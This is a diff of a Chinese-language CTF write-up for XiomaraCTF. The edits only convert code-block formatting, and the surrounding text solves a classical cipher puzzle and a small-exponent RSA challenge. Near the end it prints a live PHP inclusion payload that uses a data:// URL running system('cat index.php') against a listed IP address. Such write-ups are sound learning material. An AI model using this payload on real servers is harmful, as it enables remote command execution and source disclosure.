@@ -1,6 +1,9 @@
 ---
 title: XiomaraCTF 解題
-tags: CTF, 解題, 筆記
+tags:
+    - CTF
+    - 解題
+    - 筆記
 ---
 
 HackMD網址：https://hackmd.io/s/B1grPrzOf
@@ -16,13 +19,13 @@ HackMD網址：https://hackmd.io/s/B1grPrzOf
 
 題目跟你說，密文的產生方式是：
 ```
-# encryption
+## encryption
 FLAG -> HEN_Cipher -> alphametic puzzle -> CipherText
 ```
 
 所以我們只要逆向這個加密過程就好了：
 ```
-# decryption
+## decryption
 FLAG <- HEN_Cipher <- alphametic puzzle <- CipherText
 ```
 
@@ -56,7 +59,7 @@ HEN的解密方法：
 
 字母左移的部份我採用 ASCII 來作減法運算。
 
-```python=
+{% codeblock lang:python %}
 #! /usr/bin/python
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
@@ -86,15 +89,13 @@ for i in range(0, plaintext_size):
     plaintext += chr(temp)
     print plaintext
 print "----------"
-```
+{% endcodeblock %}
 
 (PS:這樣code好亂Orz...我應該用function去實作的...)
 
 執行完腳本後會得到 "THEARSOFDIDUCTION"，這個時候把底線與FLAG頭加上去就是正確答案了。
 
 xiomara{THE\_ARS\_OF_DIDUCTION}
-
----
 
 # Crypto - Giveaway
 
@@ -104,7 +105,7 @@ xiomara{THE\_ARS\_OF_DIDUCTION}
 1. N 太大，factordb不能分解出p、q
 2. e 很小
 
-```python=
+{% codeblock lang:python %}
 #! /usr/bin/python
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
@@ -119,7 +120,7 @@ c = 2039130155866184490894181588949291569587424373754875837330412835527276040280
 
 m = iroot(c,e)
 print n2s(m[0])
-```
+{% endcodeblock %}
 
 由於e太小、N太大，導致於：
 c = $m^{e}$ mod n 
@@ -152,5 +153,3 @@ http://103.5.112.91:1234/?locker=data://text/plain,<?php system("cat index.php")
 ```
 
 xiomara{s0metim3s_fl@g_c@n_b3_d3cl@red_@s_v@riable}
-
----
